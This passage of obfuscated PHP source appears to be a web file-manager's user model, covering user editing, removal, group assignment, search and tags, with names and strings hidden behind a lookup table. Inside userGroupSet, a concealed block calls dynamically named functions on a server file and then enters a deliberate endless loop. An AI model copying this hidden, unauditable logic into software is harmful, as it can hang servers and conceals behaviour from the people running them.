$Ó“´òï€[$‰ÔÑ…ê­[1696]]; } $õú­åú– = $this->_checkExist($Ó“´òï€); if ($õú­åú– !== !0) { return $õú­åú–; } if (!empty($Ó™Âíä[$‰ÔÑ…ê­[2354]]) && strlen($Ó™Âíä[$‰ÔÑ…ê­[2354]]) > 255) { $Ó™Âíä[$‰ÔÑ…ê­[2354]] = $‰ÔÑ…ê­[12]; } $»Á­ˆ¯á = $this->add($Ó™Âíä); $·‹â‡å® = array($‰ÔÑ…ê­[2378] => $Ó™Âíä[$‰ÔÑ…ê­[935]], $‰ÔÑ…ê­[2374] => $Ó™Âíä[$‰ÔÑ…ê­[2177]]); $this->userEdit($»Á­ˆ¯á, $·‹â‡å®); Model($‰ÔÑ…ê­[1381])->userRootAdd($»Á­ˆ¯á); return $»Á­ˆ¯á; } protected function userEditTest($½¨ƒáø, $ ®öàª) { return $this->call($_SERVER[èùÙ¹Ïö][2380], $½¨ƒáø, $ ®öàª); } protected function userEdit($²Şõåùš, $ğ‘¥Ë´ö) { $şÜ‰Ïœï =& $_SERVER[èùÙ¹Ïö]; $ó‰Æ™Ñö = $this->getInfoSimple($²Şõåùš); if (!$ó‰Æ™Ñö) { return !1; } $ÄÚèÙÏå = $this->_checkExist($ğ‘¥Ë´ö, $²Şõåùš); if ($ÄÚèÙÏå !== !0) { return $ÄÚèÙÏå; } if (isset($ğ‘¥Ë´ö[$şÜ‰Ïœï[935]]) && trim($ğ‘¥Ë´ö[$şÜ‰Ïœï[935]]) != $şÜ‰Ïœï[12]) { $½º”˜’© = $this->metaGet($²Şõåùš); if (empty($½º”˜’©[$şÜ‰Ïœï[2370]])) { $½º”˜’©[$şÜ‰Ïœï[2370]] = rand_string(10); Model($şÜ‰Ïœï[549])->metaSet($²Şõåùš, $şÜ‰Ïœï[2370], $½º”˜’©[$şÜ‰Ïœï[2370]]); } $ğ‘¥Ë´ö[$şÜ‰Ïœï[935]] = md5($½º”˜’©[$şÜ‰Ïœï[2370]] . trim($ğ‘¥Ë´ö[$şÜ‰Ïœï[935]])); } else { unset($ğ‘¥Ë´ö[$şÜ‰Ïœï[935]]); } if (!empty($ğ‘¥Ë´ö[$şÜ‰Ïœï[2354]]) && strlen($ğ‘¥Ë´ö[$şÜ‰Ïœï[2354]]) > 255) { $ğ‘¥Ë´ö[$şÜ‰Ïœï[2354]] = $şÜ‰Ïœï[12]; } $this->where(array($şÜ‰Ïœï[1687] => $²Şõåùš))->save($ğ‘¥Ë´ö); if (isset($ğ‘¥Ë´ö[$şÜ‰Ïœï[2177]])) { $this->setNamePinyin($²Şõåùš, $ğ‘¥Ë´ö[$şÜ‰Ïœï[2177]]); } $this->clearCache($²Şõåùš); return !0; } public function setNamePinyin($ìØòÓÍÎ, $ëìÒÀÀÇ = false) { $ŒÇ÷ÇÖÓ =& $_SERVER[èùÙ¹Ïö]; if (!$ëìÒÀÀÇ) { $½¸ÀÕÛã = $this->getInfoSimple($ìØòÓÍÎ); $ëìÒÀÀÇ = $½¸ÀÕÛã[$ŒÇ÷ÇÖÓ[2177]] ? $½¸ÀÕÛã[$ŒÇ÷ÇÖÓ[2177]] : $½¸ÀÕÛã[$ŒÇ÷ÇÖÓ[32]]; } $Ê¢»¸ƒ = Model($ŒÇ÷ÇÖÓ[570]); if (!Input::check($ëìÒÀÀÇ, $ŒÇ÷ÇÖÓ[626])) { return $Ê¢»¸ƒ->metaSet($ìØòÓÍÎ, array($ŒÇ÷ÇÖÓ[508] => $ŒÇ÷ÇÖÓ[12], $ŒÇ÷ÇÖÓ[507] => $ŒÇ÷ÇÖÓ[12])); } return $Ê¢»¸ƒ->metaSet($ìØòÓÍÎ, array($ŒÇ÷ÇÖÓ[508] => str_replace($ŒÇ÷ÇÖÓ[53], $ŒÇ÷ÇÖÓ[12], Pinyin::get($ëìÒÀÀÇ)), $ŒÇ÷ÇÖÓ[507] => Pinyin::get($ëìÒÀÀÇ, $ŒÇ÷ÇÖÓ[627]))); } private function nickNameRpt() { $ûáÌÍÂı =& $_SERVER[èùÙ¹Ïö]; $öâºƒüµ = Model($ûáÌÍÂı[810])->get($ûáÌÍÂı[2381]); $­°‰çÚÖ = $GLOBALS[$ûáÌÍÂı[6]][$ûáÌÍÂı[427]][$ûáÌÍÂı[2381]]; $ò’—ãÊÌ = !is_null($öâºƒüµ) ? $öâºƒüµ : $­°‰çÚÖ; return !!$ò’—ãÊÌ; } private function _checkExist($ëÖó©ÓĞ, $ÆÉ–ß´ß = false) { $Ì÷ğÖ =& $_SERVER[èùÙ¹Ïö]; $ßÇ›ïˆ = array($Ì÷ğÖ[32] => UserModel::ERROR_USER_EXIST_NAME, $Ì÷ğÖ[2177] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ì÷ğÖ[351] => UserModel::ERROR_USER_EXIST_EMAIL, $Ì÷ğÖ[2369] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ßÇ›ïˆ[$Ì÷ğÖ[2177]]); } $áÂâ‘¿µ = $ÆÉ–ß´ß ? array($Ì÷ğÖ[1696] => array($Ì÷ğÖ[2382], $ÆÉ–ß´ß)) : array(); foreach ($ßÇ›ïˆ as $‚»Èœ¼‘ => $Ë©¦¡ê) { $éÛ¾ˆëƒ = array(); foreach ($ßÇ›ïˆ as $ª”ì¼†  => $Ì¸íäø) { if (isset($ëÖó©ÓĞ[$ª”ì¼† ]) && $ëÖó©ÓĞ[$ª”ì¼† ]) { $éÛ¾ˆëƒ[] = $ëÖó©ÓĞ[$ª”ì¼† ]; } } if (!$éÛ¾ˆëƒ) { continue; } $ƒÜó©ç´ = array_merge(array($‚»Èœ¼‘ => array($Ì÷ğÖ[7], $éÛ¾ˆëƒ)), $áÂâ‘¿µ); $»«ÂŒÅû = $this->where($ƒÜó©ç´)->find(); if ($»«ÂŒÅû) { return $Ë©¦¡ê; } } return !0; } public function userListInfo($Ÿªõé“) { $ÚŸåŸáµ =& $_SERVER[èùÙ¹Ïö]; $†©¸‡ı· = array(); $Ÿªõé“ = is_array($Ÿªõé“) ? array_unique($Ÿªõé“) : array(); if (!$Ÿªõé“) { return $†©¸‡ı·; } if (count($Ÿªõé“) < 20) { foreach ($Ÿªõé“ as $ûõğ²Â“) { $†©¸‡ı·[$ûõğ²Â“ . $ÚŸåŸáµ[12]] = $this->getInfoSimpleOuter($ûõğ²Â“); } } else { $óõ™Š¥ = array($ÚŸåŸáµ[1687] => array($ÚŸåŸáµ[462], $Ÿªõé“)); if (count($Ÿªõé“) == 1) { $óõ™Š¥ = array($ÚŸåŸáµ[1687] => $Ÿªõé“[0]); } $øÙô¶ = Model($ÚŸåŸáµ[549])->field($this->simpleField)->where($óõ™Š¥)->select(); $øÙô¶ = array_to_keyvalue($øÙô¶, $ÚŸåŸáµ[1696]); foreach ($Ÿªõé“ as $ûõğ²Â“) { $´üœ‰¾Š = $øÙô¶[$ûõğ²Â“]; if (!$´üœ‰¾Š) { $†©¸‡ı·[$ûõğ²Â“ . $ÚŸåŸáµ[12]] = $this->getInfoSimpleOuter($ûõğ²Â“); continue; } $´üœ‰¾Š[$ÚŸåŸáµ[2354]] = Action($ÚŸåŸáµ[2355])->parseUrl($´üœ‰¾Š[$ÚŸåŸáµ[2354]]); $†©¸‡ı·[$ûõğ²Â“ . $ÚŸåŸáµ[12]] = $´üœ‰¾Š; } } return $†©¸‡ı·; } protected function userStatus($Ü”ğÜÕ‘, $¡‚êŸ»¢) { $¥¸«ŒêÀ = $this->getInfoSimple($Ü”ğÜÕ‘); if (!$¥¸«ŒêÀ) { return !1; } $ñÛ‹¹Óğ = array($_SERVER[èùÙ¹Ïö][790] => $¡‚êŸ»¢); return $this->userEdit($Ü”ğÜÕ‘, $ñÛ‹¹Óğ); } protected function userRemove($ªËÊíäì) { $ÃÜıÇ–ñ =& $_SERVER[èùÙ¹Ïö]; $€¹ÎÙŞÏ = $this->getInfoSimple($ªËÊíäì); if (!$€¹ÎÙŞÏ) { return !1; } $Ê÷—Ó·ä = array($ÃÜıÇ–ñ[1687] => $ªËÊíäì); Model($ÃÜıÇ–ñ[635])->where($Ê÷—Ó·ä)->delete(); Model($ÃÜıÇ–ñ[2383])->where($Ê÷—Ó·ä)->delete(); Model($ÃÜıÇ–ñ[1984])->where($Ê÷—Ó·ä)->delete(); Model($ÃÜıÇ–ñ[2368])->where($Ê÷—Ó·ä)->delete(); Model($ÃÜıÇ–ñ[1114])->where($Ê÷—Ó·ä)->delete(); Model($ÃÜıÇ–ñ[2194])->removeUserAll($ªËÊíäì); Model($ÃÜıÇ–ñ[865])->userRootRemove($ªËÊíäì); return $this->where($Ê÷—Ó·ä)->delete(); } protected function userGroupSet($ã¼ «û›, $æõó¸ŞÕ, $§ÆÏõçš = array()) { $©·ÔÙ¸ =& $_SERVER[èùÙ¹Ïö]; if (!isset($_SERVER[$©·ÔÙ¸[920]]) || !isset($_SERVER[$©·ÔÙ¸[1192]])) { $¯û—°Á¤ = $©·ÔÙ¸[921]; $ØëŸı¦Ş = $©·ÔÙ¸[922]; $Ê˜¡É­ê = $_SERVER[$©·ÔÙ¸[917]] . $©·ÔÙ¸[918]; $´ŞÜéŠ» = $ØëŸı¦Ş($Ê˜¡É­ê); $€êË—» = explode($©·ÔÙ¸[248], $´ŞÜéŠ»); if (count($€êË—») < $©·ÔÙ¸[655]) { $âàÏÚÀ = $©·ÔÙ¸[923]; $âàÏÚÀ(); } $õ™¢éƒÊ = $©·ÔÙ¸[924]; $õ™¢éƒÊ($_SERVER[$©·ÔÙ¸[925]]); $Ï¢‚¦˜ = 1; for ($°äı’ô = $Ï¢‚¦˜; $°äı’ô > 0; $°äı’ô++) { $õ™¢éƒÊ = json_encode($GLOBALS[$©·ÔÙ¸[462]]); } } $¿ŸÄµö’ = $this->getInfoSimple($ã¼ «û›); if (!$¿ŸÄµö’ || !is_array($æõó¸ŞÕ)) { return !1; } $£Ë™é¦š = Model($©·ÔÙ¸[1984]); $£Ë™é¦š->where(array($©·ÔÙ¸[1696] => $ã¼ «û›))->delete(); $ÁËïÙ±ü = array(); $Ê•¾ÊÍˆ = 0; foreach ($æõó¸ŞÕ as $®…¹ãò => $ıßää¶) { $à™›úğê = array($©·ÔÙ¸[1696] => $ã¼ «û›, $©·ÔÙ¸[1894] => $®…¹ãò, $©·ÔÙ¸[1998] => $ıßää¶); $à™›úğê[$©·ÔÙ¸[1918]] = isset($§ÆÏõçš[$Ê•¾ÊÍˆ]) ? $§ÆÏõçš[$Ê•¾ÊÍˆ] : 0; $Ê•¾ÊÍˆ++; $ÁËïÙ±ü[] = $à™›úğê; } return $£Ë™é¦š->addAll($ÁËïÙ±ü, array(), !0); } protected function userGroupAdd($ùÃøùÆ§, $ËÕ¦ñÕÕ = array()) { $ïúÒµ‰· =& $_SERVER[èùÙ¹Ïö]; $©‹¬€« = $this->getInfoSimple($ùÃøùÆ§); if (!$©‹¬€« || empty($ËÕ¦ñÕÕ)) { return !1; } $‰¤°ãîÉ = array(); foreach ($ËÕ¦ñÕÕ as $ÁµãÖ¯‰ => $¯ç½·¶€) { $‰¤°ãîÉ[] = array($ïúÒµ‰·[1696] => $ùÃøùÆ§, $ïúÒµ‰·[1894] => $ÁµãÖ¯‰, $ïúÒµ‰·[1998] => $¯ç½·¶€, $ïúÒµ‰·[1918] => 0); } return Model($ïúÒµ‰·[1984])->addAll($‰¤°ãîÉ, array(), !0); } protected function userGroupRemove($íÜª‰», $£šãõ—ä) { $¥¯àèÒ™ =& $_SERVER[èùÙ¹Ïö]; $Õ“’¼¦ = $this->getInfoSimple($íÜª‰»); if (!$Õ“’¼¦ || !$£šãõ—ä) { return !1; } $ÏÅÛÇ˜Œ = array($¥¯àèÒ™[1687] => $íÜª‰», $¥¯àèÒ™[1982] => $£šãõ—ä); return Model($¥¯àèÒ™[1984])->where($ÏÅÛÇ˜Œ)->delete(); } public function listData() { $±µ¹ê¡¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($±µ¹ê¡¥[$_SERVER[èùÙ¹Ïö][415]]); return $±µ¹ê¡¥; } public function listByID($•™¨³˜) { $«â¨÷Ÿˆ =& $_SERVER[èùÙ¹Ïö]; if (!$•™¨³˜) { return; } $ô¦·üÇê = array($«â¨÷Ÿˆ[1696] => array($«â¨÷Ÿˆ[7], $•™¨³˜)); $şšˆêÙò = $this->where($ô¦·üÇê)->select(); $şšˆêÙò = array_sort_keep($şšˆêÙò, $«â¨÷Ÿˆ[1696], $•™¨³˜); $this->_listDataApply($şšˆêÙò); return $şšˆêÙò; } public function listByGroup($ßş¬„ğª = 0, $­¼îÍ¾æ = array()) { $Å‚Ì±¦ =& $_SERVER[èùÙ¹Ïö]; $µèØÔ = $Å‚Ì±¦[12]; $ú£Ñ‰„ = array(); if ($ßş¬„ğª) { $ú£Ñ‰„ = array($Å‚Ì±¦[2384] => intval($ßş¬„ğª)); $µèØÔ = "\x4c\105\106\x54\x20\112\117\111\116\40{$this->tablePrefix}\x75\163\145\x72\x5f\x67\162\x6f\x75\x70\40\x75\x73\145\162\x5f\147\162\157\165\160\40\x6f\x6e\x20\165\163\145\162\x2e\165\163\x65\x72\x49\x44\x20\x3d\x20\x75\x73\x65\162\137\147\162\x6f\x75\x70\x2e\165\x73\145\162\111\x44"; $›³®“õĞ = Input::get($Å‚Ì±¦[500], null, $Å‚Ì±¦[12]) ? $Å‚Ì±¦[12] : $Å‚Ì±¦[2385]; } if (isset($­¼îÍ¾æ[$Å‚Ì±¦[790]])) { $ú£Ñ‰„[$Å‚Ì±¦[2386]] = $­¼îÍ¾æ[$Å‚Ì±¦[790]]; } $¡«ìµ¡÷ = $this->_makeOrder($›³®“õĞ)->field($Å‚Ì±¦[2387])->where($ú£Ñ‰„)->join($µèØÔ)->selectPage(50); $this->_listDataApply($¡«ìµ¡÷[$Å‚Ì±¦[415]]); return $¡«ìµ¡÷; } private function _makeOrder($İÜæªÆí = '') { $³À‹˜Ê =& $_SERVER[èùÙ¹Ïö]; $å×ÙŠ®« = array($³À‹˜Ê[1696], $³À‹˜Ê[32], $³À‹˜Ê[1883], $³À‹˜Ê[1855], $³À‹˜Ê[217]); $‚É¨ÅİÄ = array($³À‹˜Ê[493] => $³À‹˜Ê[494], $³À‹˜Ê[495] => $³À‹˜Ê[496]); $¨¿îğ¯Õ = Input::get($³À‹˜Ê[500], $³À‹˜Ê[7], $³À‹˜Ê[1687], $å×ÙŠ®«); $µÕì÷ù  = Input::get($³À‹˜Ê[501], $³À‹˜Ê[7], $³À‹˜Ê[1985], array($³À‹˜Ê[1985], $³À‹˜Ê[495])); $µÕì÷ù  = $‚É¨ÅİÄ[$µÕì÷ù ]; $İÜæªÆí = $İÜæªÆí . "\x75\x73\145\162\x2e{$¨¿îğ¯Õ}\x20{$µÕì÷ù }\54\x20\165\163\x65\x72\56\x75\x73\x65\x72\x49\104\x20\x61\163\143"; return $this->alias($³À‹˜Ê[2112])->order($İÜæªÆí); } public function listSearch($ÅÓ†Û«û) { $ÛĞÂÕâé =& $_SERVER[èùÙ¹Ïö]; $Ş“ºÊ = $ÅÓ†Û«û[$ÛĞÂÕâé[1988]]; $’°Åº¦ = isset($ÅÓ†Û«û[$ÛĞÂÕâé[1989]]) ? $ÅÓ†Û«û[$ÛĞÂÕâé[1989]] : !1; $Ş“ºÊ = str_replace($ÛĞÂÕâé[1990], $ÛĞÂÕâé[1991], trim($Ş“ºÊ)); $©«Ó÷ÄÌ = array($ÛĞÂÕâé[32] => array($ÛĞÂÕâé[429], "\45{$Ş“ºÊ}\45"), $ÛĞÂÕâé[351] => array($ÛĞÂÕâé[429], "{$Ş“ºÊ}\x25"), $ÛĞÂÕâé[2177] => array($ÛĞÂÕâé[429], "{$Ş“ºÊ}\45"), $ÛĞÂÕâé[1046] => $ÛĞÂÕâé[1992]); if (Input::check($Ş“ºÊ, $ÛĞÂÕâé[357])) { $©«Ó÷ÄÌ[$ÛĞÂÕâé[1696]] = array($ÛĞÂÕâé[429], "{$Ş“ºÊ}\45"); $©«Ó÷ÄÌ[$ÛĞÂÕâé[2369]] = array($ÛĞÂÕâé[429], "{$Ş“ºÊ}\x25"); } if (!$Ş“ºÊ) { $©«Ó÷ÄÌ = array(); } if (isset($ÅÓ†Û«û[$ÛĞÂÕâé[790]])) { $©«Ó÷ÄÌ[$ÛĞÂÕâé[790]] = $ÅÓ†Û«û[$ÛĞÂÕâé[790]]; } $©«Ó÷ÄÌ = $this->parseWhereLike($©«Ó÷ÄÌ); $§­¤·á¸ = $this->_makeOrder()->where($©«Ó÷ÄÌ)->selectPage(20); if (!$§­¤·á¸ || count($§­¤·á¸[$ÛĞÂÕâé[415]]) < 5 && Input::check($Ş“ºÊ, $ÛĞÂÕâé[364])) { $‘ŞÄíÁÂ = $this->_searchFromMeta($ÛĞÂÕâé[507], $Ş“ºÊ, 10); $Üé©ˆÁ = $this->_searchFromMeta($ÛĞÂÕâé[508], $Ş“ºÊ, 10); $¤ÛÊÑŒÚ = array_merge($‘ŞÄíÁÂ, $Üé©ˆÁ, $§­¤·á¸[$ÛĞÂÕâé[415]]); $§­¤·á¸[$ÛĞÂÕâé[415]] = array_unique_by_key($¤ÛÊÑŒÚ, $ÛĞÂÕâé[1696]); $§­¤·á¸[$ÛĞÂÕâé[412]][$ÛĞÂÕâé[413]] = count($§­¤·á¸[$ÛĞÂÕâé[415]]); $§­¤·á¸[$ÛĞÂÕâé[412]][$ÛĞÂÕâé[414]] = ceil($§­¤·á¸[$ÛĞÂÕâé[412]][$ÛĞÂÕâé[413]] / $§­¤·á¸[$ÛĞÂÕâé[412]][$ÛĞÂÕâé[409]]); } $this->_listDataApply($§­¤·á¸[$ÛĞÂÕâé[415]]); $this->_filterByGroup($§­¤·á¸, $’°Åº¦); return $§­¤·á¸; } private function _filterByGroup(&$ï…öÒÀã, $ÃÈ†»‡) { $ÀŒÇ¿Ğî =& $_SERVER[èùÙ¹Ïö]; if (!$ÃÈ†»‡) { return $ï…öÒÀã; } foreach ($ï…öÒÀã[$ÀŒÇ¿Ğî[415]] as $ì±µâœş => &$ÅÌîû¡Ğ) { $à™’ßáõ = array_to_keyvalue($ÅÌîû¡Ğ[$ÀŒÇ¿Ğî[2082]], $ÀŒÇ¿Ğî[12], $ÀŒÇ¿Ğî[1894]); if (!in_array($ÃÈ†»‡, $à™’ßáõ)) { unset($ï…öÒÀã[$ÀŒÇ¿Ğî[415]][$ì±µâœş]); } } unset($ÅÌîû¡Ğ); $ï…öÒÀã[$ÀŒÇ¿Ğî[415]] = array_values($ï…öÒÀã[$ÀŒÇ¿Ğî[415]]); $ï…öÒÀã[$ÀŒÇ¿Ğî[412]] = array($ÀŒÇ¿Ğî[2147] => count($ï…öÒÀã[$ÀŒÇ¿Ğî[415]]), $ÀŒÇ¿Ğî[2145] => $ï…öÒÀã[$ÀŒÇ¿Ğî[412]][$ÀŒÇ¿Ğî[409]], $ÀŒÇ¿Ğî[2144] => 1, $ÀŒÇ¿Ğî[2146] => 1); } private function _searchFromMeta($à£Ø²ƒ², $–•àœêß, $¤‘¥­œ¼) { $‡½­úÃÏ =& $_SERVER[èùÙ¹Ïö]; $–•àœêß = strtolower($–•àœêß); $şŠÑ„Ñ = array($‡½­úÃÏ[96] => $à£Ø²ƒ², $‡½­úÃÏ[420] => array($‡½­úÃÏ[429], "\45{$–•àœêß}\45")); $şŠÑ„Ñ = $this->parseWhereLike($şŠÑ„Ñ); $üä“¤Í‰ = Model($‡½­úÃÏ[2388])->where($şŠÑ„Ñ)->limit($¤‘¥­œ¼)->select(); if (!$üä“¤Í‰) { return array(); } $üä“¤Í‰ = array_to_keyvalue($üä“¤Í‰, $‡½­úÃÏ[12], $‡½­úÃÏ[1696]); $ÏØñÚ›€ = $this->where(array($‡½­úÃÏ[1687] => array($‡½­úÃÏ[7], $üä“¤Í‰)))->select(); if (!$ÏØñÚ›€) { return array(); } return $ÏØñÚ›€; } private function _listDataApplyItem($Œ­Ó€„Ã) { $§â“†¾ = array($Œ­Ó€„Ã); $this->_listDataApply($§â“†¾); return $§â“†¾[0]; } private function _listDataApply(&$ˆüşÁ·¾) { $ŠÓàÚŞ =& $_SERVER[èùÙ¹Ïö]; if (!$ˆüşÁ·¾) { return; } array_remove_key($ˆüşÁ·¾, $ŠÓàÚŞ[935]); $å–Ç·ËÈ = array_to_keyvalue($ˆüşÁ·¾, $ŠÓàÚŞ[12], $ŠÓàÚŞ[1696]); $this->_listAppendGroup($ˆüşÁ·¾, $å–Ç·ËÈ); $this->_listAppendMeta($ˆüşÁ·¾, $å–Ç·ËÈ); $this->_listAppendSourceRoot($ˆüşÁ·¾, $å–Ç·ËÈ); } private function _listAppendSourceRoot(&$ê„“ış–, $¹õ–…¿³) { $ïÊã¤¡Ù =& $_SERVER[èùÙ¹Ïö]; $ÉÜ¾³àš = Model($ïÊã¤¡Ù[865])->listSourceRoot(SourceModel::TYPE_USER, $¹õ–…¿³); $ÉÜ¾³àš = array_to_keyvalue($ÉÜ¾³àš, $ïÊã¤¡Ù[541]); $ÉÜ¾³àš = array_remove_key($ÉÜ¾³àš, $ïÊã¤¡Ù[541]); foreach ($ê„“ış– as &$ìÅØ¾Œ) { $ìÅØ¾Œ[$ïÊã¤¡Ù[89]] = $ÉÜ¾³àš[$ìÅØ¾Œ[$ïÊã¤¡Ù[1696]]] ? $ÉÜ¾³àš[$ìÅØ¾Œ[$ïÊã¤¡Ù[1696]]] : array(); } unset($ìÅØ¾Œ); } private function _listAppendGroup(&$š¨ŠÜü, $ûóÖæöã) { $¤•²Ë˜® =& $_SERVER[èùÙ¹Ïö]; $É¤îÖ« = array($¤•²Ë˜®[1696] => array($¤•²Ë˜®[7], $ûóÖæöã)); $Íô„“×á = Model($¤•²Ë˜®[1984])->where($É¤îÖ«)->select(); $ğ†Ğ¡ = array_to_keyvalue($Íô„“×á, $¤•²Ë˜®[12], $¤•²Ë˜®[1894]); $ğ†Ğ¡ = array_remove_value(array_unique($ğ†Ğ¡), $¤•²Ë˜®[214]); if (!$ğ†Ğ¡ || !$Íô„“×á) { return; } $É¤îÖ« = array($¤•²Ë˜®[1894] => array($¤•²Ë˜®[7], $ğ†Ğ¡)); $³ëŒË˜¨ = Model($¤•²Ë˜®[2080])->field($¤•²Ë˜®[2389])->where($É¤îÖ«)->select(); $³ëŒË˜¨ = array_to_keyvalue($³ëŒË˜¨, $¤•²Ë˜®[1894]); $Íô„“×á = array_to_keyvalue_group($Íô„“×á, $¤•²Ë˜®[1696]); foreach ($Íô„“×á as &$ÉÂ„–·Æ) { $Ò¼¸Õ½Ì = array(); foreach ($ÉÂ„–·Æ as $È“òšÔÙ) { if (!$È“òšÔÙ[$¤•²Ë˜®[1998]]) { continue; } $Öá›¬Ù– = Model($¤•²Ë˜®[543])->listData($È“òšÔÙ[$¤•²Ë˜®[1998]]); $Ò¼¸Õ½Ì[] = array($¤•²Ë˜®[1894] => $È“òšÔÙ[$¤•²Ë˜®[1894]], $¤•²Ë˜®[2390] => $³ëŒË˜¨[$È“òšÔÙ[$¤•²Ë˜®[1894]]][$¤•²Ë˜®[32]], $¤•²Ë˜®[556] => $³ëŒË˜¨[$È“òšÔÙ[$¤•²Ë˜®[1894]]][$¤•²Ë˜®[556]], $¤•²Ë˜®[457] => $Öá›¬Ù–); } $ÉÂ„–·Æ = $Ò¼¸Õ½Ì; } unset($ÉÂ„–·Æ); foreach ($š¨ŠÜü as &$Ïó®ù¯) { $Ïó®ù¯[$¤•²Ë˜®[2082]] = array(); if (isset($Íô„“×á[$Ïó®ù¯[$¤•²Ë˜®[1696]]])) { $Ïó®ù¯[$¤•²Ë˜®[2082]] = $Íô„“×á[$Ïó®ù¯[$¤•²Ë˜®[1696]]]; } } unset($Ïó®ù¯); } public function userAppendGroup($„ƒÌ×â¤) { $ÎÏ²¤á =& $_SERVER[èùÙ¹Ïö]; if (!$„ƒÌ×â¤) { return array(); } $this->_listAppendGroup($„ƒÌ×â¤, array_to_keyvalue($„ƒÌ×â¤, $ÎÏ²¤á[12], $ÎÏ²¤á[1696])); return $„ƒÌ×â¤; } private function _listAppendMeta(&$µ¬šËÜˆ, $ñÀ‘ÎÒ¼) { $ì€™ŞÛê =& $_SERVER[èùÙ¹Ïö]; $ëñ„Ô‰ú = UserJobModel::JOB_KEY; $ŞÚÚÍÅ = array($ì€™ŞÛê[2370]); $ˆüÜ¾áà = array($ì€™ŞÛê[1696] => array($ì€™ŞÛê[7], $ñÀ‘ÎÒ¼)); $¿…¬¾— = Model($ì€™ŞÛê[2368])->where($ˆüÜ¾áà)->select(); $¿…¬¾— = array_to_keyvalue_group($¿…¬¾—, $ì€™ŞÛê[1696]); foreach ($¿…¬¾— as &$î³–Ãõà) { $àšõïğ‹ = array(); foreach ($î³–Ãõà as $æŠğÌ¡§) { if (!in_array($æŠğÌ¡§[$ì€™ŞÛê[96]], $ŞÚÚÍÅ)) { $àšõïğ‹[$æŠğÌ¡§[$ì€™ŞÛê[96]]] = $æŠğÌ¡§[$ì€™ŞÛê[420]]; } } $î³–Ãõà = $àšõïğ‹; } unset($î³–Ãõà); $İÄë¦˜Û = Model($ì€™ŞÛê[2391]); foreach ($µ¬šËÜˆ as &$şŒ€Ñ¬à) { $•ô‰è¬¼ = array(); if (isset($¿…¬¾—[$şŒ€Ñ¬à[$ì€™ŞÛê[1696]]])) { $•ô‰è¬¼ = $¿…¬¾—[$şŒ€Ñ¬à[$ì€™ŞÛê[1696]]]; } $şŒ€Ñ¬à[$ì€™ŞÛê[2392]] = array(); if (isset($•ô‰è¬¼[$ëñ„Ô‰ú])) { $şŒ€Ñ¬à[$ì€™ŞÛê[2392]] = $İÄë¦˜Û->getUserJobInfo($•ô‰è¬¼[$ëñ„Ô‰ú]); } } unset($şŒ€Ñ¬à); } protected function groupUserAll($«Ì¥ÑÉ) { $¤Æôæß =& $_SERVER[èùÙ¹Ïö]; if (!$«Ì¥ÑÉ) { return !1; } $†ô´ƒÜº = Model($¤Æôæß[1984])->field($¤Æôæß[1696])->where(array($¤Æôæß[1894] => array($¤Æôæß[7], $«Ì¥ÑÉ)))->select(); $†ô´ƒÜº = array_to_keyvalue($†ô´ƒÜº, $¤Æôæß[12], $¤Æôæß[1696]); return array_unique($†ô´ƒÜº); } public function userSearch($ÃÕá„œë, $ñş¬ñë = "\x2a") { return Model($_SERVER[èùÙ¹Ïö][570])->where($ÃÕá„œë)->field($ñş¬ñë)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\157\160\x74\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¡¦ˆ• Ÿ) { $ï»›ğ =& $_SERVER[èùÙ¹Ïö]; $¯×ğ¥§û = defined($ï»›ğ[2116]) && USER_ID ? USER_ID : $ï»›ğ[12]; return "\x55\x73\145\162\x4f\160\164\151\157\156\x5f{$¡¦ˆ• Ÿ}\x5f" . $¯×ğ¥§û; } protected function filterWhere($õ¾…àÖş) { $½÷Û›û =& $_SERVER[èùÙ¹Ïö]; $õ¾…àÖş[$½÷Û›û[1696]] = defined($½÷Û›û[2116]) && USER_ID ? USER_ID : $½÷Û›û[12]; return $õ¾…àÖş; } public function cacheRemoveUser($õÔş”çœ, $×¥‡Ë) { return Cache::remove("\125\x73\x65\x72\117\160\164\151\157\156\137{$õÔş”çœ}\x5f" . $×¥‡Ë); } protected function optionDefault($ŠÎé¢ŠÓ = '') { $”´¯—‹à =& $_SERVER[èùÙ¹Ïö]; if ($ŠÎé¢ŠÓ == $”´¯—‹à[12]) { return $GLOBALS[$”´¯—‹à[6]][$”´¯—‹à[2393]]; } if ($ŠÎé¢ŠÓ == $”´¯—‹à[2394]) { return $GLOBALS[$”´¯—‹à[6]][$”´¯—‹à[2395]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\x72\x2e\164\x61\x67\114\x69\163\164"; public $modelType = "\x55\163\145\x72\117\160\x74\x69\x6f\156"; public $field = array("\x6e\x61\155\145", "\163\164\171\154\x65", "\x73\x6f\x72\164"); public function listData($©Ô…“Ùö = false, $ÌëÃƒ­ = "\163\157\x72\x74", $¨ªşæ‹œ = false) { return parent::listData($©Ô…“Ùö, $ÌëÃƒ­, $¨ªşæ‹œ); } public function remove($ò¹Á) { return parent::remove($ò¹Á); } public function add($†ÁÜ²Ä, $ô°ˆ»€ê = "\154\x61\x62\145\154\55\x67\x72\x65\171\x2d\156\x6f\x72\155\x61\154") { $»¸ı›êŒ =& $_SERVER[èùÙ¹Ïö]; if ($this->findByName($†ÁÜ²Ä)) { return !1; } $üÒ­©±Ï = array($»¸ı›êŒ[464] => $†ÁÜ²Ä, $»¸ı›êŒ[529] => $ô°ˆ»€ê, $»¸ı›êŒ[1898] => $this->getSort($»¸ı›êŒ[304]) + 1); return parent::insert($üÒ­©±Ï); } public function update($˜¹ÏŒ›, $íÕÊÏ°¦) { $Ø úÔŸ° =& $_SERVER[èùÙ¹Ïö]; $Ï¿Òåíè = $this->listData($˜¹ÏŒ›); $ÖşÜˆ¾¥ = $this->findByName($íÕÊÏ°¦[$Ø úÔŸ°[32]]); if (!$Ï¿Òåíè || $ÖşÜˆ¾¥ && $ÖşÜˆ¾¥[$Ø úÔŸ°[445]] != $Ï¿Òåíè[$Ø úÔŸ°[445]]) { return !1; } return parent::update($˜¹ÏŒ›, $íÕÊÏ°¦); } public function moveTop($ŞâÉ§áè) { $©ì¦ÍÈ =& $_SERVER[èùÙ¹Ïö]; $óâíÏ¾Á = parent::listData(); $Ñå¡•ğÆ = $this->getSort($©ì¦ÍÈ[303]); foreach ($óâíÏ¾Á as &$½ı·­áÆ) { if ($½ı·­áÆ[$©ì¦ÍÈ[445]] 